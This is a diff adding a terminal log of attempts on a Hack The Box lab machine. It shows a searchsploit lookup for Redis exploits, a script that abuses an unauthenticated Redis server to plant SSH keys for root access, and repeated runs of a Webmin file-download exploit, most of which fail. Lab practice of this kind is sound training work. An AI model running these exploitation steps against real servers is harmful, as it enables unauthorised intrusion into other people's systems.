@@ -1,0 +1,124 @@
+root@parrot:~/hackthebox/postman# searchsploit postman                           
+Exploits: No Result                     
+Shellcodes: No Result                   
+root@parrot:~/hackthebox/postman# searchsploit redis                             
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                            |  Path                                  
+                                                                                                                          | (/usr/share/exploitdb/)                
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                                             | exploits/linux/remote/47195.rb         
+Redis 5.0 - Denial of Service                                                                                             | exploits/linux/dos/44908.txt           
+Redis-cli < 5.0 - Buffer Overflow (PoC)                                                                                   | exploits/linux/local/44904.py          
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                   
+root@parrot:~/hackthebox/postman# searchsploit -x exploits/linux/remote/47195.rb 
+  Exploit: Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)         
+      URL: https://www.exploit-db.com/exploits/47195                             
+     Path: /usr/share/exploitdb/exploits/linux/remote/47195.rb                   
+File Type: Ruby script, ASCII text, with CRLF line terminators                   
+
+
+
+root@parrot:~/hackthebox/postman# vi redis.py                                    
+root@parrot:~/hackthebox/postman# vi redis.py                                    
+root@parrot:~/hackthebox/postman# python redis.py user                           
+Traceback (most recent call last):      
+  File "redis.py", line 12, in <module> 
+    script, ip_address, username = argv 
+ValueError: need more than 2 values to unpack                                    
+root@parrot:~/hackthebox/postman# python redis.py 10.10.10.160 username = root   
+Traceback (most recent call last):      
+  File "redis.py", line 12, in <module> 
+    script, ip_address, username = argv 
+ValueError: too many values to unpack   
+root@parrot:~/hackthebox/postman# vi redis.py                                    
+root@parrot:~/hackthebox/postman# python redis.py                                
+        *******************************************************************      
+        * [+] [Exploit] Exploiting misconfigured REDIS SERVER*                   
+        * [+] AVINASH KUMAR THAPA aka "-Acid"                                    
+        *******************************************************************      
+
+
+         SSH Keys Need to be Generated  
+Generating public/private rsa key pair. 
+Enter file in which to save the key (/root/.ssh/id_rsa): /root/hackthebox/postman/                                                                                 
+/root/hackthebox/postman/ already exists.                                        
+Overwrite (y/n)? n                      
+         Keys Generated Successfully    
+cat: /root/.ssh/id_rsa.pub: No such file or directory                            
+OK                                      
+OK                                      
+OK                                      
+(error) ERR Changing directory: Permission denied                                
+OK                                      
+OK                                      
+        You'll get shell in sometime..Thanks for your patience                   
+Warning: Identity file /root/.ssh/id_rsa not accessible: No such file or directory.                                                                                
+The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.     
+ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.     
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes         
+Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.    
+root@10.10.10.160's password:           
+Permission denied, please try again.    
+root@10.10.10.160's password:           
+^Croot@parrot:~/hackthebox/postman# ifconfig tun0                                
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500               
+        inet 10.10.14.14  netmask 255.255.254.0  destination 10.10.14.14         
+        inet6 dead:beef:2::100c  prefixlen 64  scopeid 0x0<global>               
+        inet6 fe80::355c:b6a4:ccc0:ec0b  prefixlen 64  scopeid 0x20<link>        
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)                                                                           
+        RX packets 6288  bytes 1665923 (1.5 MiB)                                 
+        RX errors 0  dropped 0  overruns 0  frame 0                              
+        TX packets 8405  bytes 719970 (703.0 KiB)                                
+        TX errors 0  dropped 465 overruns 0  carrier 0  collisions 0             
+
+root@parrot:~/hackthebox/postman# less 47293.sh                                  
+root@parrot:~/hackthebox/postman# ls    
+47293.sh  foo.txt  matt  matt.john  nmap  redis.py  ssh  ssh.pub  www            
+root@parrot:~/hackthebox/postman# vi exploit.py                                  
+root@parrot:~/hackthebox/postman# vi exploit.py                                  
+root@parrot:~/hackthebox/postman# python exploit.py                              
+[PORT]> 5000                            
+[Webmin IP]> 10.10.10.160               
+
+webmin file download 0day...            
+Connected!                              
+Traceback (most recent call last):      
+  File "exploit.py", line 37, in <module>                                        
+    print s.recv(1024)                  
+socket.error: [Errno 107] Transport endpoint is not connected                    
+root@parrot:~/hackthebox/postman# python exploit.py                              
+[PORT]> 5000                            
+[Webmin IP]> 10.10.10.160               
+
+webmin file download 0day...            
+Connected!                              
+Traceback (most recent call last):      
+  File "exploit.py", line 37, in <module>                                        
+    print s.recv(1024)                  
+socket.error: [Errno 107] Transport endpoint is not connected                    
+root@parrot:~/hackthebox/postman# python exploit.py                              
+[PORT]> 5000                            
+[Webmin IP]> 10.10.10.160               
+
+webmin file download 0day...            
+^CTraceback (most recent call last):    
+  File "exploit.py", line 34, in <module>                                        
+    conn, addr = s.accept()             
+  File "/usr/lib/python2.7/socket.py", line 206, in accept                       
+    sock, addr = self._sock.accept()    
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/postman# vi exploit.py                                  
+root@parrot:~/hackthebox/postman# vi exploit.py                                                                                                                    
+root@parrot:~/hackthebox/postman# python exploit.py                                                                                                                
+[PORT]> 5000                            
+[Webmin IP]> 10.10.10.160               
+
+webmin file download 0day...            
+^CTraceback (most recent call last):    
+  File "exploit.py", line 34, in <module>                                        
+    conn, addr = s.accept()             
+  File "/usr/lib/python2.7/socket.py", line 206, in accept                       
+    sock, addr = self._sock.accept()    
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/postman#       
